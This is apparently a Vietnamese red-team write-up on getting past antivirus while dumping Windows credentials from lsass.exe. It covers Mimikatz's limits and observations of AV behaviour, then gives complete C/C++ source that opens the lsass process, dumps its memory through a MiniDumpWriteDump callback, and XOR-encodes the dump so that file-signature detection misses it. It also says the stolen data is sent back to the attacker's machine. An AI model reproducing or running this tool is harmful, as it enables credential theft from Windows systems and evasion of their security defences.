# Description 
Mimikatz là công cụ mã nguồn mở dùng để khai thác và phân tích cơ chế xác thực của Windows, nổi bật với khả năng trích xuất thông tin đăng nhập từ LSASS, SAM và tương tác với Kerberos.

Các vấn đề của Mimikatz:
- Dễ bị Antivirus phát hiện thông qua chữ ký (Signature-based Detection).
- Bị EDR giám sát hành vi truy cập LSASS và Credential Dumping.
- Một số chức năng yêu cầu quyền Administrator hoặc SYSTEM.
- Bị hạn chế bởi các cơ chế bảo vệ như Credential Guard và LSA Protection.
- Khả năng tương thích có thể bị ảnh hưởng bởi các bản cập nhật Windows.

# Troubleshoot
Dump Credential của người dùng trên máy, thường sẽ dump từ lsass.exe và có rất nhiều công cụ phổ biến và cách làm khác nhau, chưa chắc đã bắt buộc phải cần Minikaiz.
## Giả thuyết
- Mimikaiz là một công cụ đã quá phổ biến, vậy nên chắc chắn sẽ có Signature trên các hệ thống AV, vậy nên nếu tải thẳng Mimikatz lên máy nạn nhân thì Mimikaiz sẽ bị bắt.
- Nếu sử dụng công cụ khác có được không?
  + Lsass.exe khi chạy là 1 process đặc trưng, ít có ai tác động đến nó, nếu tác động vào nó và đặc biệt là dump process đó ra thì đó sẽ là hành động lạ và AV/EDR sẽ bắt ngay.
  + AV chỉ bắt file data đã được dump ở dưới ổ đĩa.

## Time Line 
- Khám phá công cụ Mimikatz (Tôi nghiên cứu thêm về các tính năng của Mimikatz, những tính năng nằm ngoài việc dump process lsass.exe).
- Thử dump bằng các cách khác (Tôi dump bằng task manager và procdump, nhưng vẫn bị AV bắt).
- Quan sát hành động của AV (AV nhận file dmp được dump ra từ process chạy lsass.exe là Malware).
- Viết 1 công cụ dump khác.
- Dump được dữ liệu thì liền transfer dữ liệu đó về máy Attacker để phân tích.

## Kết luận 
- Dữ liệu được dump ra sẽ chứa credential của người dùng, nên AV khi đọc được phần này (Signature) sẽ liền xóa đi luôn.
- Cần trả lời câu hỏi: Trong trường hợp file dmp bị mã hóa trước khi rơi xuống ổ đĩa thì sao?

# Step to reproduce 
Bước 1: Quan sát hành động của AV khi dump data 
Sau khi tiến hành dump data bằng nhiều cách khác nhau, tôi nhận thấy, file dmp được dump thường bị bắt, chứ không phải do hành động can thiệp vào tiến trình dump
<img width="973" height="655" alt="image" src="https://github.com/user-attachments/assets/1f38637f-9e88-452e-a8dd-0c9f1cf04ed0" />

Bước 2: 
Viết tools từ windows API thử nghiệm giả thuyết, là mã hóa dữ liệu trước khi lưu vào ổ đĩa 

```C/C++
#include <windows.h>
#include <DbgHelp.h>
#include <iostream>
#include <TlHelp32.h>
#include <processsnapshot.h>
#pragma comment (lib, "Dbghelp.lib")
#pragma comment (lib, "Advapi32.lib")

using namespace std;


LPVOID dumpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 75);
DWORD bytesRead = 0;

void dbgLastError(const char* ctx) {
	DWORD e = GetLastError();
	printf("[-] ERROR at %s: GetLastError=%lu (0x%lx)\n", ctx, e, e);
}

BOOL CALLBACK minidumpCallback(
	__in     PVOID callbackParam,
	__in     const PMINIDUMP_CALLBACK_INPUT callbackInput,
	__inout  PMINIDUMP_CALLBACK_OUTPUT callbackOutput
)
{
	LPVOID destination = 0, source = 0;
	DWORD bufferSize = 0;

	switch (callbackInput->CallbackType)
	{
		case IoStartCallback:
			callbackOutput->Status = S_FALSE;
			break;
		case IoWriteAllCallback:
			callbackOutput->Status = S_OK;
			

			source = callbackInput->Io.Buffer;
			
			destination = (LPVOID)((DWORD_PTR)dumpBuffer + (DWORD_PTR)callbackInput->Io.Offset);
			
			bufferSize = callbackInput->Io.BufferBytes;
			bytesRead += bufferSize;
			
			RtlCopyMemory(destination, source, bufferSize);
			
			printf("[+] Minidump offset: 0x%llx; length: 0x%x\n", (unsigned long long)callbackInput->Io.Offset, bufferSize);
			break;

		case IoFinishCallback:
			callbackOutput->Status = S_OK;
			break;

		default:
			return true;
	}
	return TRUE;
}

int main(int argc, char* argv[]) {
	DWORD PID = 0;
	DWORD bytesWritten = 0;
	HANDLE processHandle = NULL;
	PROCESSENTRY32 processEntry = {};
	processEntry.dwSize = sizeof(PROCESSENTRY32);

	if (argc < 2) {
		fprintf(stderr, "Usage: %s <lsass PID>\n", argv[0]);
		return 1;
	}

	PID = (DWORD)strtoul(argv[1], NULL, 10);
	printf("[*] Target PID = %lu (0x%lx)\n", PID, PID);


	processHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, PID);
	if (processHandle == NULL) {
		dbgLastError("OpenProcess");
		printf("[-] OpenProcess failed. Co the do thieu SeDebugPrivilege hoac PPL.\n");
		return 1;
	}
	printf("[+] OpenProcess OK, handle=0x%p\n", processHandle);
	

	MINIDUMP_CALLBACK_INFORMATION callbackInfo;
	ZeroMemory(&callbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));
	callbackInfo.CallbackRoutine = &minidumpCallback;
	callbackInfo.CallbackParam = NULL;

	printf("[*] Starting MiniDumpWriteDump...\n");
	BOOL isDumped = MiniDumpWriteDump(processHandle, PID, NULL, MiniDumpWithFullMemory, NULL, NULL, &callbackInfo);
	printf("[*] MiniDumpWriteDump returned: %s (bytesRead=%u)\n", isDumped ? "TRUE" : "FALSE", bytesRead);

	if (!isDumped) {
		dbgLastError("MiniDumpWriteDump");
	}

	if (isDumped) 
	{
		const BYTE xorKey = 0x5A; 
		BYTE* pBuf = (BYTE*)dumpBuffer;
		for (DWORD i = 0; i < bytesRead; i++) {
			pBuf[i] ^= xorKey;
		}
		printf("[+] XOR encoding done (key=0x%02x, %u bytes)\n", xorKey, bytesRead);

		HANDLE outFile = CreateFile(L"process.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (outFile == INVALID_HANDLE_VALUE) {
			dbgLastError("CreateFile");
			printf("[-] CreateFile failed.");
			return 1;
		}
		printf("[+] CreateFile OK, handle=0x%p\n", outFile);

		if (WriteFile(outFile, dumpBuffer, bytesRead, &bytesWritten, NULL))
		{
			printf("\n[+] process dumped from 0x%p to process.dmp (%u bytes)\n", dumpBuffer, bytesWritten);
		}
		else {
			dbgLastError("WriteFile");
		}
		CloseHandle(outFile);
	}

	printf("[*] Done. Cleaning up.\n");
	CloseHandle(processHandle);
	return 0;
}
```

Bước 3: 

# Reference
